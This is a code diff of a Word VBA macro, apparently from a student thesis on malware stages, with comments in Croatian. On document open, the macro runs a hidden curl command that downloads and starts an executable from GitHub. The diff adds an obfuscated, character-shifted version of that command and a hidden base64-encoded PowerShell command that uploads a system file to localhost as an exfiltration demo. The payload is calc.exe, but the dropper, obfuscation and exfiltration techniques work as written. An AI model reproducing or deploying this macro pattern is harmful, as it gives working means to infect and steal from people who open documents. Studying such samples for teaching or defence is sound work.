@@ -6,19 +6,19 @@ Sub Document_Open()
     objShell.Run "calc"
     
 'preuzimanje i pokretanje remote datoteke za primjer stageava u malwareima
-    Shell "cmd /c curl -L ""https://github.com/acpwinters/Zavrsni_Rad/raw/main/calc.exe"" --output p.exe && start p.exe", vbHide
+    Shell "cmd /c curl -L ""https://github.com/acpwinters/Zavrsni_Rad/raw/main/calc.exe"" --output preuzeto.exe && start preuzeto.exe", vbHide
+
+'obfuscirano preuzimanje i pokretanje remote datoteke
+NdkF = "": For i = 1 To 146: NdkF = NdkF + Chr(Asc(Mid("hri%4h%hzwq%2Q%''myyux?44lnymzg3htr4fhu|nsyjwx4_f{wxsndWfi4wf|4rfns4hfqh3j}j''%22tzyuzy%tgkzxhnwfstduwjzjyt3j}j%++%xyfwy%tgkzxhnwfstduwjzjyt3j}j", i, 1)) - (5)): Next
+Shell NdkF, vbHide
 
 'upload calc.exe na localhost za primjer exfiltracije podataka
-'powershell.exe -nop -w hidden -enc "YwB1AHIAbAAuAGUAeABlACAALQBYACAAUABPAFMAVAAgAC0ARgAgACIAZgBpAGwAZQA9AEAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAYQBsAGMALgBlAHgAZQAiACAAaAB0AHQAcAA6AC8ALwAxADIANwAuAD
-'AALgAwAC4AMQA6ADgAMAAwADAA ""
-'$cmd = "curl.exe -X POST -F ""file=@C:\Windows\System32\calc.exe"" http://127.0.0.1:8000"
-'$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
-'$encoded = [Convert]::ToBase64String($bytes)
-'$encoded
-
-    Dim Str As String
-    Str = Str & "powershell.exe -nop -w hidden -e ""Y3VybC5leGUgLVggUE9TVCBcIC1GICJma"
-    Str = Str & "WxlPUBDOlxXaW5kb3dzXFN5c3RlbTMyXGNhbGMuZXhlIiBodHRwOi8vMTI3LjAuMC4xOjgwMDA="""
-    CreateObject("Wscript.Shell").Run Str, 0
+    Dim exfil As String
+    exfil = exfil & "powershell.exe -nop -w hidden -e ""YwB1AHIAbAAuAGUAeABlACAALQBYACAAUABPAFMAVAAg"
+    exfil = exfil & "AC0ARgAgACIAZgBpAGwAZQA9AEAAQwA6AFwAVwBpA"""
+    exfil = exfil & "G4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAG"""
+    exfil = exfil & "MAYQBsAGMALgBlAHgAZQAiACAAaAB0AHQAcAA6AC8"""
+    exfil = exfil & "ALwAxADIANwAuADAALgAwAC4AMQA6ADgAMAAwADAA"""
+    CreateObject("Wscript.Shell").Run exfil, 0
 
 End Sub
